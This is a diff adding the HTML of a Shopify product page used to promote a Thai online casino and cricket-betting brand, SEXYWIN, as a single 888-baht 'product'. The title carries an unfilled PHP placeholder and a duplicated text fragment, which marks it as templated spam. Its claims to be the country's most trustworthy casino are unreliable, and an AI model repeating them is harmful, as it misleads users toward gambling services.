+  .list-menu__item--link {
+    text-decoration: none;
+    padding-bottom: 1rem;
+    padding-top: 1rem;
+    line-height: calc(1 + 0.8 / var(--font-body-scale));
+  }
+
+  @media screen and (min-width: 750px) {
+    .list-menu__item--link {
+      padding-bottom: 0.5rem;
+      padding-top: 0.5rem;
+    }
+  }
+</style><style data-shopify>.header {
+    padding: 10px 3rem 10px 3rem;
+  }
+
+  .section-header {
+    position: sticky; /* This is for fixing a Safari z-index issue. PR #2147 */
+    margin-bottom: 0px;
+  }
+
+  @media screen and (min-width: 750px) {
+    .section-header {
+      margin-bottom: 0px;
+    }
+  }
+
+  @media screen and (min-width: 990px) {
+    .header {
+      padding-top: 20px;
+      padding-bottom: 20px;
+    }
+  }</style><script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/details-disclosure.js?v=13653116266235556501707725438" defer="defer"></script>
+<script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/details-modal.js?v=25581673532751508451707725437" defer="defer"></script>
+<script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/cart-notification.js?v=133508293167896966491707725421" defer="defer"></script>
+<script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/search-form.js?v=133129549252120666541707725428" defer="defer"></script><svg xmlns="http://www.w3.org/2000/svg" class="hidden">
+  <symbol id="icon-search" viewbox="0 0 18 19" fill="none">
+    <path fill-rule="evenodd" clip-rule="evenodd" d="M11.03 11.68A5.784 5.784 0 112.85 3.5a5.784 5.784 0 018.18 8.18zm.26 1.12a6.78 6.78 0 11.72-.7l5.4 5.4a.5.5 0 11-.71.7l-5.41-5.4z" fill="currentColor"/>
+  </symbol>
+
+  <symbol id="icon-reset" class="icon icon-close"  fill="none" viewBox="0 0 18 18" stroke="currentColor">
+    <circle r="8.5" cy="9" cx="9" stroke-opacity="0.2"/>
+    <path d="M6.82972 6.82915L1.17193 1.17097" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
+    <path d="M1.22896 6.88502L6.77288 1.11523" stroke-linecap="round" stroke-linejoin="round" transform="translate(5 5)"/>
+  </symbol>
+
+  <symbol id="icon-close" class="icon icon-close" fill="none" viewBox="0 0 18 17">
+    <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
+  </symbol>
+</svg><sticky-header data-sticky-type="on-scroll-up" class="header-wrapper color-scheme-1 gradient header-wrapper--border-bottom"><header class="header header--middle-left header--mobile-center page-width header--has-menu">
+
+<header-drawer data-breakpoint="tablet">
+  <details id="Details-menu-drawer-container" class="menu-drawer-container">
+    <summary
+      class="header__icon header__icon--menu header__icon--summary link focus-inset"
+      aria-label="Menu"
+    >
+      <span>
+        <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-hamburger"
+  fill="none"
+  viewBox="0 0 18 16"
+>
+  <path d="M1 .5a.5.5 0 100 1h15.71a.5.5 0 000-1H1zM.5 8a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1A.5.5 0 01.5 8zm0 7a.5.5 0 01.5-.5h15.71a.5.5 0 010 1H1a.5.5 0 01-.5-.5z" fill="currentColor">
+</svg>
+
+        <svg
+  xmlns="http://www.w3.org/2000/svg"
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-close"
+  fill="none"
+  viewBox="0 0 18 17"
+>
+  <path d="M.865 15.978a.5.5 0 00.707.707l7.433-7.431 7.579 7.282a.501.501 0 00.846-.37.5.5 0 00-.153-.351L9.712 8.546l7.417-7.416a.5.5 0 10-.707-.708L8.991 7.853 1.413.573a.5.5 0 10-.693.72l7.563 7.268-7.418 7.417z" fill="currentColor">
+</svg>
+
+      </span>
+    </summary>
+    <div id="menu-drawer" class="gradient menu-drawer motion-reduce color-scheme-1">
+      <div class="menu-drawer__inner-container">
+        <div class="menu-drawer__navigation-container">
+          <nav class="menu-drawer__navigation">
+            <ul class="menu-drawer__menu has-submenu list-menu" role="list"><li><a
+                      id="HeaderDrawer-home"
+                      href="/"
+                      class="menu-drawer__menu-item list-menu__item link link--text focus-inset"
+                      
+                    >
+                      Home
+                    </a></li><li><a
+                      id="HeaderDrawer-catalog"
+                      href="/collections/all"
+                      class="menu-drawer__menu-item list-menu__item link link--text focus-inset"
+                      
+                    >
+                      Catalog
+                    </a></li><li><a
+                      id="HeaderDrawer-contact"
+                      href="/pages/contact"
+                      class="menu-drawer__menu-item list-menu__item link link--text focus-inset"
+                      
+                    >
+                      Contact
+                    </a></li></ul>
+          </nav>
+          <div class="menu-drawer__utility-links"><div class="menu-drawer__localization header-localization">
+</div><ul class="list list-social list-unstyled" role="list"></ul>
+          </div>
+        </div>
+      </div>
+    </div>
+  </details>
+</header-drawer>
+<a href="/" class="header__heading-link link link--text focus-inset"><div class="header__heading-logo-wrapper">
+                
+                <img src="//d3dc94-3.myshopify.com/cdn/shop/files/image07.png?v=1707726357&amp;width=600" alt="SEXYWIN" srcset="//d3dc94-3.myshopify.com/cdn/shop/files/image07.png?v=1707726357&amp;width=80 80w, //d3dc94-3.myshopify.com/cdn/shop/files/image07.png?v=1707726357&amp;width=120 120w, //d3dc94-3.myshopify.com/cdn/shop/files/image07.png?v=1707726357&amp;width=160 160w" width="80" height="83.65591397849462" loading="eager" class="header__heading-logo motion-reduce" sizes="(max-width: 160px) 50vw, 80px">
+              </div></a>
+
+<nav class="header__inline-menu">
+  <ul class="list-menu list-menu--inline" role="list"><li><a
+            id="HeaderMenu-home"
+            href="/"
+            class="header__menu-item list-menu__item link link--text focus-inset"
+            
+          >
+            <span
+            >Home</span>
+          </a></li><li><a
+            id="HeaderMenu-catalog"
+            href="/collections/all"
+            class="header__menu-item list-menu__item link link--text focus-inset"
+            
+          >
+            <span
+            >Catalog</span>
+          </a></li><li><a
+            id="HeaderMenu-contact"
+            href="/pages/contact"
+            class="header__menu-item list-menu__item link link--text focus-inset"
+            
+          >
+            <span
+            >Contact</span>
+          </a></li></ul>
+</nav>
+
+<div class="header__icons header__icons--localization header-localization">
+      <div class="desktop-localization-wrapper">
+</div>
+      
+
+<details-modal class="header__search">
+  <details>
+    <summary
+      class="header__icon header__icon--search header__icon--summary link focus-inset modal__toggle"
+      aria-haspopup="dialog"
+      aria-label="Search"
+    >
+      <span>
+        <svg class="modal__toggle-open icon icon-search" aria-hidden="true" focusable="false">
+          <use href="#icon-search">
+        </svg>
+        <svg class="modal__toggle-close icon icon-close" aria-hidden="true" focusable="false">
+          <use href="#icon-close">
+        </svg>
+      </span>
+    </summary>
+    <div
+      class="search-modal modal__content gradient"
+      role="dialog"
+      aria-modal="true"
+      aria-label="Search"
+    >
+      <div class="modal-overlay"></div>
+      <div
+        class="search-modal__content search-modal__content-bottom"
+        tabindex="-1"
+      ><predictive-search class="search-modal__form" data-loading-text="Loading..."><form action="/search" method="get" role="search" class="search search-modal__form">
+          <div class="field">
+            <input
+              class="search__input field__input"
+              id="Search-In-Modal"
+              type="search"
+              name="q"
+              value=""
+              placeholder="Search"role="combobox"
+                aria-expanded="false"
+                aria-owns="predictive-search-results"
+                aria-controls="predictive-search-results"
+                aria-haspopup="listbox"
+                aria-autocomplete="list"
+                autocorrect="off"
+                autocomplete="off"
+                autocapitalize="off"
+                spellcheck="false">
+            <label class="field__label" for="Search-In-Modal">Search</label>
+            <input type="hidden" name="options[prefix]" value="last">
+            <button
+              type="reset"
+              class="reset__button field__button hidden"
+              aria-label="Clear search term"
+            >
+              <svg class="icon icon-close" aria-hidden="true" focusable="false">
+                <use xlink:href="#icon-reset">
+              </svg>
+            </button>
+            <button class="search__button field__button" aria-label="Search">
+              <svg class="icon icon-search" aria-hidden="true" focusable="false">
+                <use href="#icon-search">
+              </svg>
+            </button>
+          </div><div class="predictive-search predictive-search--header" tabindex="-1" data-predictive-search>
+
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481707725442" rel="stylesheet" type="text/css" media="all" />
+
+<div class="predictive-search__loading-state">
+  <svg
+    aria-hidden="true"
+    focusable="false"
+    class="spinner"
+    viewBox="0 0 66 66"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
+  </svg>
+</div>
+</div>
+
+            <span class="predictive-search-status visually-hidden" role="status" aria-hidden="true"></span></form></predictive-search><button
+          type="button"
+          class="search-modal__close-button modal__close-button link link--text focus-inset"
+          aria-label="Close"
+        >
+          <svg class="icon icon-close" aria-hidden="true" focusable="false">
+            <use href="#icon-close">
+          </svg>
+        </button>
+      </div>
+    </div>
+  </details>
+</details-modal>
+
+<a href="/cart" class="header__icon header__icon--cart link focus-inset" id="cart-icon-bubble"><svg
+  class="icon icon-cart-empty"
+  aria-hidden="true"
+  focusable="false"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 40 40"
+  fill="none"
+>
+  <path d="m15.75 11.8h-3.16l-.77 11.6a5 5 0 0 0 4.99 5.34h7.38a5 5 0 0 0 4.99-5.33l-.78-11.61zm0 1h-2.22l-.71 10.67a4 4 0 0 0 3.99 4.27h7.38a4 4 0 0 0 4-4.27l-.72-10.67h-2.22v.63a4.75 4.75 0 1 1 -9.5 0zm8.5 0h-7.5v.63a3.75 3.75 0 1 0 7.5 0z" fill="currentColor" fill-rule="evenodd"/>
+</svg>
+<span class="visually-hidden">Cart</span></a>
+    </div>
+  </header>
+</sticky-header>
+
+<cart-notification>
+  <div class="cart-notification-wrapper page-width">
+    <div
+      id="cart-notification"
+      class="cart-notification focus-inset color-scheme-1 gradient"
+      aria-modal="true"
+      aria-label="Item added to your cart"
+      role="dialog"
+      tabindex="-1"
+    >
+      <div class="cart-notification__header">
+        <h2 class="cart-notification__heading caption-large text-body"><svg
+  class="icon icon-checkmark"
+  aria-hidden="true"
+  focusable="false"
+  xmlns="http://www.w3.org/2000/svg"
+  viewBox="0 0 12 9"
+  fill="none"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M11.35.643a.5.5 0 01.006.707l-6.77 6.886a.5.5 0 01-.719-.006L.638 4.845a.5.5 0 11.724-.69l2.872 3.011 6.41-6.517a.5.5 0 01.707-.006h-.001z" fill="currentColor"/>
+</svg>
+Item added to your cart
+        </h2>
+        <button
+          type="button"
+          class="cart-notification__close modal__close-button link link--text focus-inset"
+          aria-label="Close"
+        >
+          <svg class="icon icon-close" aria-hidden="true" focusable="false">
+            <use href="#icon-close">
+          </svg>
+        </button>
+      </div>
+      <div id="cart-notification-product" class="cart-notification-product"></div>
+      <div class="cart-notification__links">
+        <a
+          href="/cart"
+          id="cart-notification-button"
+          class="button button--secondary button--full-width"
+        >View cart</a>
+        <form action="/cart" method="post" id="cart-notification-form">
+          <button class="button button--primary button--full-width" name="checkout">
+            Check out
+          </button>
+        </form>
+        <button type="button" class="link button-label">Continue shopping</button>
+      </div>
+    </div>
+  </div>
+</cart-notification>
+<style data-shopify>
+  .cart-notification {
+    display: none;
+  }
+</style>
+
+
+<script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "Organization",
+    "name": "SEXYWIN",
+    
+      "logo": "https:\/\/d3dc94-3.myshopify.com\/cdn\/shop\/files\/image07.png?v=1707726357\u0026width=500",
+    
+    "sameAs": [
+      "",
+      "",
+      "",
+      "",
+      "",
+      "",
+      "",
+      "",
+      ""
+    ],
+    "url": "https:\/\/d3dc94-3.myshopify.com"
+  }
+</script>
+</div>
+<!-- END sections: header-group -->
+
+    <main id="MainContent" class="content-for-layout focus-none" role="main" tabindex="-1">
+      <section id="shopify-section-template--17446643597562__main" class="shopify-section section"><section
+  id="MainProduct-template--17446643597562__main"
+  class="section-template--17446643597562__main-padding gradient color-scheme-1"
+  data-section="template--17446643597562__main"
+>
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/section-main-product.css?v=133064301994206342221707725416" rel="stylesheet" type="text/css" media="all" />
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-accordion.css?v=180964204318874863811707725417" rel="stylesheet" type="text/css" media="all" />
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-price.css?v=70172745017360139101707725421" rel="stylesheet" type="text/css" media="all" />
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-slider.css?v=142503135496229589681707725424" rel="stylesheet" type="text/css" media="all" />
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-rating.css?v=157771854592137137841707725435" rel="stylesheet" type="text/css" media="all" />
+  <link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-deferred-media.css?v=14096082462203297471707725435" rel="stylesheet" type="text/css" media="all" />
+  
+<style data-shopify>.section-template--17446643597562__main-padding {
+      padding-top: 27px;
+      padding-bottom: 9px;
+    }
+
+    @media screen and (min-width: 750px) {
+      .section-template--17446643597562__main-padding {
+        padding-top: 36px;
+        padding-bottom: 12px;
+      }
+    }</style><script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/product-info.js?v=125122232605238659181707725426" defer="defer"></script>
+  <script src="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/product-form.js?v=133081758708377679181707725418" defer="defer"></script>
+
+  <div class="page-width">
+    <div class="product product--large product--left product--stacked product--mobile-hide grid grid--1-col grid--2-col-tablet">
+    <div class="grid__item product__media-wrapper">
+      
+<media-gallery
+  id="MediaGallery-template--17446643597562__main"
+  role="region"
+  
+    class="product__column-sticky"
+  
+  aria-label="Gallery Viewer"
+  data-desktop-layout="stacked"
+>
+  <div id="GalleryStatus-template--17446643597562__main" class="visually-hidden" role="status"></div>
+  <slider-component id="GalleryViewer-template--17446643597562__main" class="slider-mobile-gutter"><a class="skip-to-content-link button visually-hidden quick-add-hidden" href="#ProductInfo-template--17446643597562__main">
+        Skip to product information
+      </a><ul
+      id="Slider-Gallery-template--17446643597562__main"
+      class="product__media-list contains-media grid grid--peek list-unstyled slider slider--mobile"
+      role="list"
+    ><li
+            id="Slide-template--17446643597562__main-33159673872634"
+            class="product__media-item grid__item slider__slide is-active scroll-trigger animate--fade-in"
+            data-media-id="template--17446643597562__main-33159673872634"
+          >
+
+<div
+  class="product-media-container media-type-image media-fit-contain global-media-settings gradient constrain-height"
+  style="--ratio: 0.983957219251337; --preview-ratio: 0.983957219251337;"
+>
+  <noscript><div class="product__media media">
+        <img src="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1946" alt="" srcset="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=246 246w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=493 493w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=600 600w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=713 713w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=823 823w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=990 990w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1100 1100w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1206 1206w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1346 1346w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1426 1426w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1646 1646w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1946 1946w" width="1946" height="1978" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
+      </div></noscript>
+
+  <modal-opener class="product__modal-opener product__modal-opener--image no-js-hidden" data-modal="#ProductModal-template--17446643597562__main">
+    <span class="product__media-icon motion-reduce quick-add-hidden product__media-icon--lightbox" aria-hidden="true"><svg
+  aria-hidden="true"
+  focusable="false"
+  class="icon icon-plus"
+  width="19"
+  height="19"
+  viewBox="0 0 19 19"
+  fill="none"
+  xmlns="http://www.w3.org/2000/svg"
+>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M4.66724 7.93978C4.66655 7.66364 4.88984 7.43922 5.16598 7.43853L10.6996 7.42464C10.9758 7.42395 11.2002 7.64724 11.2009 7.92339C11.2016 8.19953 10.9783 8.42395 10.7021 8.42464L5.16849 8.43852C4.89235 8.43922 4.66793 8.21592 4.66724 7.93978Z" fill="currentColor"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.92576 4.66463C8.2019 4.66394 8.42632 4.88723 8.42702 5.16337L8.4409 10.697C8.44159 10.9732 8.2183 11.1976 7.94215 11.1983C7.66601 11.199 7.44159 10.9757 7.4409 10.6995L7.42702 5.16588C7.42633 4.88974 7.64962 4.66532 7.92576 4.66463Z" fill="currentColor"/>
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M12.8324 3.03011C10.1255 0.323296 5.73693 0.323296 3.03011 3.03011C0.323296 5.73693 0.323296 10.1256 3.03011 12.8324C5.73693 15.5392 10.1255 15.5392 12.8324 12.8324C15.5392 10.1256 15.5392 5.73693 12.8324 3.03011ZM2.32301 2.32301C5.42035 -0.774336 10.4421 -0.774336 13.5395 2.32301C16.6101 5.39361 16.6366 10.3556 13.619 13.4588L18.2473 18.0871C18.4426 18.2824 18.4426 18.599 18.2473 18.7943C18.0521 18.9895 17.7355 18.9895 17.5402 18.7943L12.8778 14.1318C9.76383 16.6223 5.20839 16.4249 2.32301 13.5395C-0.774335 10.4421 -0.774335 5.42035 2.32301 2.32301Z" fill="currentColor"/>
+</svg>
+</span>
+
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481707725442" rel="stylesheet" type="text/css" media="all" />
+
+<div class="loading__spinner hidden">
+  <svg
+    aria-hidden="true"
+    focusable="false"
+    class="spinner"
+    viewBox="0 0 66 66"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
+  </svg>
+</div>
+<div class="product__media media media--transparent">
+      <img src="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1946" alt="" srcset="//d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=246 246w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=493 493w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=600 600w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=713 713w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=823 823w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=990 990w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1100 1100w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1206 1206w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1346 1346w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1426 1426w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1646 1646w, //d3dc94-3.myshopify.com/cdn/shop/files/image.webp?v=1707735740&amp;width=1946 1946w" width="1946" height="1978" class="image-magnify-lightbox" sizes="(min-width: 1200px) 715px, (min-width: 990px) calc(65.0vw - 10rem), (min-width: 750px) calc((100vw - 11.5rem) / 2), calc(100vw / 1 - 4rem)">
+    </div>
+    <button class="product__media-toggle quick-add-hidden product__media-zoom-lightbox" type="button" aria-haspopup="dialog" data-media-id="33159673872634">
+      <span class="visually-hidden">
+        Open media 1 in modal
+      </span>
+    </button>
+  </modal-opener></div>
+
+          </li></ul><div class="slider-buttons no-js-hidden quick-add-hidden small-hide">
+        <button
+          type="button"
+          class="slider-button slider-button--prev"
+          name="previous"
+          aria-label="Slide left"
+        >
+          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
+</svg>
+
+        </button>
+        <div class="slider-counter caption">
+          <span class="slider-counter--current">1</span>
+          <span aria-hidden="true"> / </span>
+          <span class="visually-hidden">of</span>
+          <span class="slider-counter--total">1</span>
+        </div>
+        <button
+          type="button"
+          class="slider-button slider-button--next"
+          name="next"
+          aria-label="Slide right"
+        >
+          <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
+</svg>
+
+        </button>
+      </div></slider-component></media-gallery>
+
+    </div>
+    <div class="product__info-wrapper grid__item scroll-trigger animate--slide-in">
+      <product-info
+        id="ProductInfo-template--17446643597562__main"
+        data-section="template--17446643597562__main"
+        data-url="/products/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94"
+        class="product__info-container product__column-sticky"
+      ><p
+                class="product__text inline-richtext caption-with-letter-spacing"
+                
+              ><?php echo $BRANDS ?></p><div class="product__title" >
+                <h1><?php echo $BRANDS ?> 💎 【SEXYWIN.COM】 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!</h1>
+                <a href="/products/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94" class="product__title">
+                  <h2 class="h1">
+                    <?php echo $BRANDS ?> 💎 【SEXYWIN.COM】 คาสิโนออนไลน์ที่น่าเชื่อถือที่สุดในประเทศไทย | เว็บไซต์เดิมพันคริกเก็ตที่ดีที่สุด!นคริกเก็ตที่ดีที่สุด!
+                  </h2>
+                </a>
+              </div><div class="no-js-hidden" id="price-template--17446643597562__main" role="status" >
+<div
+  class="
+    price price--large price--show-badge"
+>
+  <div class="price__container"><div class="price__regular"><span class="visually-hidden visually-hidden--inline">Regular price</span>
+        <span class="price-item price-item--regular">
+          888.00 ฿ THB
+        </span></div>
+    <div class="price__sale">
+        <span class="visually-hidden visually-hidden--inline">Regular price</span>
+        <span>
+          <s class="price-item price-item--regular">
+            
+              
+            
+          </s>
+        </span><span class="visually-hidden visually-hidden--inline">Sale price</span>
+      <span class="price-item price-item--sale price-item--last">
+        888.00 ฿ THB
+      </span>
+    </div>
+    <small class="unit-price caption hidden">
+      <span class="visually-hidden">Unit price</span>
+      <span class="price-item price-item--last">
+        <span></span>
+        <span aria-hidden="true">/</span>
+        <span class="visually-hidden">&nbsp;per&nbsp;</span>
+        <span>
+        </span>
+      </span>
+    </small>
+  </div><span class="badge price__badge-sale color-scheme-4">
+      Sale
+    </span>
+
+    <span class="badge price__badge-sold-out color-scheme-3">
+      Sold out
+    </span></div>
+</div><div class="product__tax caption rte"></div>
+              <div ><form method="post" action="/cart/add" id="product-form-installment-template--17446643597562__main" accept-charset="UTF-8" class="installment caption-large" enctype="multipart/form-data"><input type="hidden" name="form_type" value="product" /><input type="hidden" name="utf8" value="✓" /><input type="hidden" name="id" value="45178743423226">
+                  
+<input type="hidden" name="product-id" value="8172904907002" /><input type="hidden" name="section-id" value="template--17446643597562__main" /></form></div>
+<noscript class="product-form__noscript-wrapper-template--17446643597562__main">
+  <div class="product-form__input hidden">
+    <label class="form__label" for="Variants-template--17446643597562__main">Product variants</label>
+    <div class="select">
+      <select
+        name="id"
+        id="Variants-template--17446643597562__main"
+        class="select__select"
+        form="product-form-template--17446643597562__main"
+      ><option
+            
+              selected="selected"
+            
+            
+            value="45178743423226"
+          >Default Title - 888.00 ฿</option></select>
+      <svg aria-hidden="true" focusable="false" class="icon icon-caret" viewBox="0 0 10 6">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M9.354.646a.5.5 0 00-.708 0L5 4.293 1.354.646a.5.5 0 00-.708.708l4 4a.5.5 0 00.708 0l4-4a.5.5 0 000-.708z" fill="currentColor">
+</svg>
+
+    </div>
+  </div>
+</noscript>
+
+<div
+                id="Quantity-Form-template--17446643597562__main"
+                class="product-form__input product-form__quantity"
+                
+              >
+                
+                
+
+                <label class="quantity__label form__label" for="Quantity-template--17446643597562__main">
+                  Quantity
+                  <span class="quantity__rules-cart no-js-hidden hidden">
+
+<link href="//d3dc94-3.myshopify.com/cdn/shop/t/1/assets/component-loading-spinner.css?v=116724955567955766481707725442" rel="stylesheet" type="text/css" media="all" />
+
+<div class="loading__spinner hidden">
+  <svg
+    aria-hidden="true"
+    focusable="false"
+    class="spinner"
+    viewBox="0 0 66 66"
+    xmlns="http://www.w3.org/2000/svg"
+  >
+    <circle class="path" fill="none" stroke-width="6" cx="33" cy="33" r="30"></circle>
+  </svg>
+</div>
+<span>(<span class="quantity-cart">0</span> in cart)</span>
+                  </span>
+                </label>
+                <div class="price-per-item__container">
+                  <quantity-input class="quantity" data-url="/products/betlix-%F0%9F%92%8E-%E0%B8%84%E0%B8%B2%E0%B8%AA%E0%B8%B4%E0%B9%82%E0%B8%99%E0%B8%AD%E0%B8%AD%E0%B8%99%E0%B9%84%E0%B8%A5%E0%B8%99%E0%B9%8C%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%99%E0%B9%88%E0%B8%B2%E0%B9%80%E0%B8%8A%E0%B8%B7%E0%B9%88%E0%B8%AD%E0%B8%96%E0%B8%B7%E0%B8%AD%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94%E0%B9%83%E0%B8%99%E0%B8%9B%E0%B8%A3%E0%B8%B0%E0%B9%80%E0%B8%97%E0%B8%A8%E0%B9%84%E0%B8%97%E0%B8%A2-%E0%B9%80%E0%B8%A7%E0%B9%87%E0%B8%9A%E0%B9%84%E0%B8%8B%E0%B8%95%E0%B9%8C%E0%B9%80%E0%B8%94%E0%B8%B4%E0%B8%A1%E0%B8%9E%E0%B8%B1%E0%B8%99%E0%B8%84%E0%B8%A3%E0%B8%B4%E0%B8%81%E0%B9%80%E0%B8%81%E0%B9%87%E0%B8%95%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%94%E0%B8%B5%E0%B8%97%E0%B8%B5%E0%B9%88%E0%B8%AA%E0%B8%B8%E0%B8%94" data-section="template--17446643597562__main">
+                    <button class="quantity__button no-js-hidden" name="minus" type="button">
